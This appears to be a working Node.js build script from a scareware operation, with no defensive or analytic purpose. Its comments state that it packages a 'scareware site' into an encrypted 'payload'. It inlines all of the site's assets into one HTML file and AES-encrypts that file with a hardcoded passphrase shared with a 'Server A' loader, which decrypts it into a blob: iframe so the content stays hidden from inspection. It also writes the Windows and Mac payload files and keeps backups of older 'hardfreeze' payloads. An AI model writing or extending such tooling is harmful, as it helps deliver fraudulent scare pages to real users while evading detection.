// make_blob.js — convert the new_japan/english scareware site into the Server B "blob" payload.
//
// What it does:
//   1. Reads the scareware source (index.html + css/ + js/ + images/ + media/) from
//      ../../../../new_japan/english  (override: node make_blob.js <SOURCE_FOLDER>)
//   2. Inlines every CSS/JS file and embeds every image/mp3 as a base64 data URI,
//      producing ONE self-contained HTML file (required because Server A loads the
//      decrypted page into an iframe via a blob: URL, where relative paths can't resolve).
//   3. Encrypts it with CryptoJS-compatible AES (Salted__ format) using the SAME
//      PASSPHRASE as the existing payloads, so Server A's index.html works unchanged.
//   4. Writes data/data_win.json + data/data_mac.json (old ones backed up as *.hardfreeze.bak)
//      and refreshed plaintext copies in decrypted/ for local testing.
//
// USAGE:  node make_blob.js [SOURCE_FOLDER]
//
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const PASSPHRASE = '98yNCjeAfWMwk0wI'; // MUST match Server A's const PASSPHRASE
const HERE = __dirname;
const SRC = path.resolve(process.argv[2] || path.join(HERE, '..', '..', '..', 'new_japan', 'english'));

if (!fs.existsSync(path.join(SRC, 'index.html'))) {
  console.error('Source folder not found: ' + SRC);
  process.exit(1);
}
const rd = (f) => fs.readFileSync(path.join(SRC, f));
const rdTxt = (f) => fs.readFileSync(path.join(SRC, f), 'utf8');

// ---------- 1. data URIs for every asset ----------
const MIME = { '.png': 'image/png', '.jpg': 'image/jpeg', '.jpeg': 'image/jpeg', '.mp3': 'audio/mpeg' };
function dataUri(file) { // file relative to SRC, e.g. 'images/main-bg.png'
  const ext = path.extname(file).toLowerCase();
  return 'data:' + MIME[ext] + ';base64,' + rd(file).toString('base64');
}

// Reference forms actually found in the code (verified by scan):
//   css:  url(../images/wallpaper-BrXAb79z.jpg)  /  url(../images/wallpaper-macos-Db_bfLdl.jpg)
//   js:   "/images/dm.png"  "/images/main-bg.png"  (inside template literals)
//   js:   'media/ndcjwsa.mp3'  'media/new-voice.mp3'  (setAttribute strings)
//   html: href="images/dm.png"  (favicon)
const REPLACEMENTS = [
  // longest / most specific first so substrings are never half-replaced
  ['../images/wallpaper-macos-Db_bfLdl.jpg', dataUri('images/wallpaper-macos-Db_bfLdl.jpg')],
  ['../images/wallpaper-BrXAb79z.jpg',       dataUri('images/wallpaper-BrXAb79z.jpg')],
  ['/images/main-bg.png',                    dataUri('images/main-bg.png')],
  ['/images/dm.png',                         dataUri('images/dm.png')],   // JS form (leading slash)
  ['media/new-voice.mp3',                    dataUri('media/new-voice.mp3')],
  ['media/ndcjwsa.mp3',                      dataUri('media/ndcjwsa.mp3')],
  ['images/dm.png',                          dataUri('images/dm.png')]    // HTML form (after the / form is gone)
];

function embedAssets(text, label) {
  let out = text, applied = 0;
  for (const [needle, uri] of REPLACEMENTS) {
    const n = out.split(needle).length - 1;
    if (n > 0) { out = out.split(needle).join(uri); applied += n; }
  }
  // leftover relative refs would 404 inside the blob iframe -> report them
  const leftovers = out.match(/(?:src|href)=["'](?:\/)?(?:images|media|css|js)\/[^"']+/g) ||
                    out.match(/url\(\s*["']?(?:\.\.\/)?(?:images|media)\/[^)"']+/g) || [];
  console.log('  ' + label + ': ' + applied + ' asset ref(s) embedded' +
              (leftovers.length ? '  ⚠️ LEFTOVERS: ' + JSON.stringify(leftovers) : ''));
  return out;
}

// ---------- 2. build the self-contained HTML ----------
console.log('Source: ' + SRC);
let cssMain = embedAssets(rdTxt('css/main.css'), 'css/main.css');
let cssIndex = embedAssets(rdTxt('css/index-WfccW8On.css'), 'css/index-WfccW8On.css');
let jsBundle = embedAssets(rdTxt('js/index-BGOkcEU4.js'), 'js/index-BGOkcEU4.js');
let jsMedia = embedAssets(rdTxt('js/mediaskn.js'), 'js/mediaskn.js');
let jsFrns = embedAssets(rdTxt('js/Frns2nszka.js'), 'js/Frns2nszka.js');

// sanity: no raw </script> inside any inlined JS (would break the inline tag)
for (const [n, t] of [['index-BGOkcEU4', jsBundle], ['mediaskn', jsMedia], ['Frns2nszka', jsFrns]]) {
  if (/<\/script>/i.test(t)) { console.error('FATAL: raw </script> inside ' + n); process.exit(1); }
}

// NOTE: use splice (not String.replace) — replace() treats $& / $' / `$ as patterns
// inside the replacement text, and the minified bundle contains such sequences.
function subOnce(text, needle, replacement) {
  const i = text.indexOf(needle);
  if (i === -1) { console.error('FATAL: tag not found: ' + needle.slice(0, 60)); process.exit(1); }
  return text.slice(0, i) + replacement + text.slice(i + needle.length);
}

let html = rdTxt('index.html');
html = subOnce(html, '<link rel="icon" href="images/dm.png" type="image/x-icon">',
               '<link rel="icon" href="' + dataUri('images/dm.png') + '" type="image/png">');
html = subOnce(html, '<script type="module" src="js/index-BGOkcEU4.js"></script>',
               '<script type="module">\n' + jsBundle + '\n</script>');
html = subOnce(html, '<link rel="stylesheet" crossorigin="" href="css/index-WfccW8On.css">',
               '<style>\n' + cssIndex + '\n</style>');
html = subOnce(html, '<link rel="stylesheet" crossorigin="" href="css/main.css">',
               '<style>\n' + cssMain + '\n</style>');
html = subOnce(html, '<script src="js/mediaskn.js"></script>',
               '<script>\n' + jsMedia + '\n</script>');
html = subOnce(html, '<script src="js/Frns2nszka.js"></script>',
               '<script>\n' + jsFrns + '\n</script>');

// every replacement must have matched exactly once
for (const probe of ['index-BGOkcEU4', 'css/index-WfccW8On.css', 'css/main.css', 'js/mediaskn.js', 'js/Frns2nszka.js']) {
  if (html.includes(probe)) { console.error('FATAL: un-inlined reference remains: ' + probe); process.exit(1); }
}
console.log('Self-contained HTML built: ' + (html.length / 1024).toFixed(1) + ' KB');

// ---------- 3. encrypt (CryptoJS "Salted__" compatible) ----------
function evpBytesToKey(password, salt, keyLen, ivLen) {
  let d = Buffer.alloc(0), out = Buffer.alloc(0);
  while (out.length < keyLen + ivLen) {
    const h = crypto.createHash('md5');
    h.update(d); h.update(password); h.update(salt);
    d = h.digest();
    out = Buffer.concat([out, d]);
  }
  return { key: out.slice(0, keyLen), iv: out.slice(keyLen, keyLen + ivLen) };
}
function encryptWithPassphrase(plaintext, passphrase) {
  const salt = crypto.randomBytes(8);
  const { key, iv } = evpBytesToKey(Buffer.from(passphrase, 'utf8'), salt, 32, 16);
  const c = crypto.createCipheriv('aes-256-cbc', key, iv);
  const enc = Buffer.concat([c.update(Buffer.from(plaintext, 'utf8')), c.final()]);
  return Buffer.concat([Buffer.from('Salted__', 'ascii'), salt, enc]).toString('base64');
}
function decryptWithPassphrase(b64, passphrase) {
  const buf = Buffer.from(b64, 'base64');
  if (buf.slice(0, 8).toString('latin1') !== 'Salted__') throw new Error('bad magic');
  const { key, iv } = evpBytesToKey(Buffer.from(passphrase, 'utf8'), buf.slice(8, 16), 32, 16);
  const d = crypto.createDecipheriv('aes-256-cbc', key, iv);
  return Buffer.concat([d.update(buf.slice(16)), d.final()]).toString('utf8');
}

const cipher = encryptWithPassphrase(html, PASSPHRASE);
if (decryptWithPassphrase(cipher, PASSPHRASE) !== html) { console.error('FATAL: round-trip mismatch'); process.exit(1); }
console.log('Encrypted + round-trip verified. Cipher length: ' + cipher.length);

// ---------- 4. write outputs (same JSON shape as the existing payloads) ----------
const payload = '{\n  "cipher": "' + cipher + '"\n}\n';
const backupIfNew = (p, bakName) => {
  if (fs.existsSync(p) && !fs.existsSync(bakName)) fs.copyFileSync(p, bakName);
};
backupIfNew(path.join(HERE, 'data', 'data_win.json'), path.join(HERE, 'data', 'data_win.hardfreeze.bak'));
backupIfNew(path.join(HERE, 'data', 'data_mac.json'), path.join(HERE, 'data', 'data_mac.hardfreeze.bak'));
backupIfNew(path.join(HERE, 'decrypted', 'popup_win.html'), path.join(HERE, 'decrypted', 'popup_win.hardfreeze.bak'));
backupIfNew(path.join(HERE, 'decrypted', 'popup_mac.html'), path.join(HERE, 'decrypted', 'popup_mac.hardfreeze.bak'));

// The scareware page auto-detects win/mac internally (CSS --win-bg/--mac-bg + JS currentOS),
// so ONE payload serves both platforms.
fs.writeFileSync(path.join(HERE, 'data', 'data_win.json'), payload);
fs.writeFileSync(path.join(HERE, 'data', 'data_mac.json'), payload);
fs.writeFileSync(path.join(HERE, 'decrypted', 'popup_win.html'), html);
fs.writeFileSync(path.join(HERE, 'decrypted', 'popup_mac.html'), html);

console.log('Done.');
console.log('  data/data_win.json   ' + (payload.length / 1024).toFixed(1) + ' KB');
console.log('  data/data_mac.json   ' + (payload.length / 1024).toFixed(1) + ' KB');
console.log('  decrypted/popup_win.html + popup_mac.html refreshed for local testing');
console.log('Old hardfreeze payloads backed up as *.hardfreeze.bak');

